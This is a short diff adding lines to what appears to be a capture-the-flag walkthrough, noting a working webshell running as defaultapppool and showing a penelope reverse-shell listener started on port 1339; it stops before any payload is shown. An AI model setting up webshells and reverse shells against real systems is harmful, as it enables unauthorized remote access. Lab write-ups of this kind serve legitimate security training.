@@ -714,3 +714,11 @@ Now browsing to it i have a working webshell
 ![[Pasted image 20260401162751.png]]
 As seen here this is running as `defaultapppool`
 
+```python
+penelope -p 1339           
+[+] Listening for reverse shells on 0.0.0.0:1339 -> 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Ive set a listener
+
+Now ill use this 
